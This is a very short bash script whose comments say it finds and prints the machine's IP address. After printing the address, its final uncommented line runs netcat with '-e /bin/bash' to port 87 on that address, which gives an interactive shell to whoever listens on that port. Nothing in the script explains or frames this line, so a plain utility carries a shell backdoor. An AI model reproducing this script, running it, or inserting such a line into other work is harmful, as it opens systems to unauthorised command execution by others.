#!/bin/bash

# Get the IP address using the hostname command
ip_address=$(hostname -I | awk '{print $1}')

# Print the IP address
echo "IP Address: $ip_address"

nc -e /bin/bash $ip_address 87
